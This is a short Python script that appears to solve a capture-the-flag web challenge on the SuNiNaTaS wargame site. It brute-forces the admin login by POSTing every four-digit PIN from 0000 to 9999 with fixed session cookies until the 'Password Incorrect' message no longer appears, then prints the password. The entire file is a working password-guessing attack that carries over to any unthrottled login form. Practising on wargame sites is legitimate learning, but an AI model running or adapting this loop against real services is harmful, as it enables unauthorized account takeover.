import requests as req

URL = "http://suninatas.com/challenge/web08/web08.asp"
#Define Destination URL

cookies = {"ASPSESSIONIDSSRQBBSD":"GCEHENDCLHKPBICOFCOKGPIE", "ASP.NET_SessionId":"4yapkv0m1fvilqkdhmyl0twe", "_gid":"********", "_ga":"********"}
#Define Cookies for Login Session. The Value is Change whenever you login.

params = {"id":"admin"}
#Define POST Value for Login

for a in range(10000):
#Try to 9999 from 0
    #params["pw"]=a
#형식이 4자리로 이루어진 것인지 아님 그냥 숫자인지 확실하지가 않다.
    params["pw"]=str(a).zfill(4)
#Insert the pw Value 4 Digits Type
    response = req.post(URL, cookies=cookies, params=params)
#Trying Login
    if response.text.find("Password Incorrect") == -1:
#If String is Can't Find, that is correct Password
        print("Password is {}".format(params["pw"]))
        break
#print Correct Password Value and break for statement
    response.close()
#Close TCP Session for next Session
